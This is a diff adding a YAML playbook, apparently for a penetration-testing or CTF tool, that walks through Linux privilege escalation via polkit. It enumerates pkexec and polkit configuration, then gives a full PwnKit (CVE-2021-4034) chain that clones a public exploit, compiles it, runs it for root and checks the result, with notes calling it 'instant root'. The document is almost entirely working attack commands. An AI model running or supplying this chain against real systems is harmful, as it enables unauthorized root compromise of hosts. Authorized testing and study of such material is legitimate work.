@@ -1,0 +1,94 @@
+name: Linux Privilege Escalation - Polkit
+
+steps:
+
+# =========================================================
+# [1] ENUMERATE POLKIT
+# =========================================================
+- title: Enumerate Polkit
+  mode: enum
+  info: |
+    Identify PolicyKit components and pkexec availability.
+
+  entries:
+
+    - cmd: "which pkexec"
+      info: verify pkexec exists
+
+    - cmd: "pkexec --version"
+      info: identify pkexec version
+
+    - cmd: "find / -name pkexec 2>/dev/null"
+      info: locate pkexec binaries
+
+    - cmd: "ps aux | grep polkit"
+      info: identify running polkit services
+
+    - cmd: "ls -la /usr/share/polkit-1/actions"
+      info: inspect policy actions
+
+    - cmd: "ls -la /etc/polkit-1/"
+      info: inspect local polkit configuration
+
+  notes:
+    - pkexec is the primary attack surface
+    - older systems commonly vulnerable
+    - PolicyKit often installed by default
+
+# =========================================================
+# [2] VERIFY PKEXEC ACCESS
+# =========================================================
+- title: Verify Pkexec Access
+  mode: enum
+  info: |
+    Test whether pkexec execution is possible.
+
+  entries:
+
+    - cmd: "pkexec -u root id"
+      info: test pkexec execution
+
+    - cmd: "pkaction | head"
+      info: enumerate available actions
+
+    - cmd: "pkcheck --help"
+      info: verify pkcheck availability
+
+  notes:
+    - authentication prompts are normal
+    - failures still confirm pkexec presence
+    - pkexec functionality matters more than permissions
+
+# =========================================================
+# [3] PWNKIT (CVE-2021-4034)
+# =========================================================
+- title: PwnKit (CVE-2021-4034)
+  mode: chain
+  info: |
+    Exploit pkexec local privilege escalation vulnerability.
+
+  entries:
+
+    - cmd: "pkexec --version"
+      info: identify vulnerable version
+
+    - cmd: "git clone https://github.com/arthepsy/CVE-2021-4034.git"
+      info: clone exploit
+
+    - cmd: "cd CVE-2021-4034"
+      info: enter exploit directory
+
+    - cmd: "gcc cve-2021-4034-poc.c -o poc"
+      info: compile exploit
+
+    - cmd: "./poc"
+      info: execute exploit
+
+    - cmd: "id"
+      info: verify privileges
+
+  notes:
+    - also known as PwnKit
+    - affects many Linux distributions
+    - extremely reliable on vulnerable systems
+    - instant root when successful
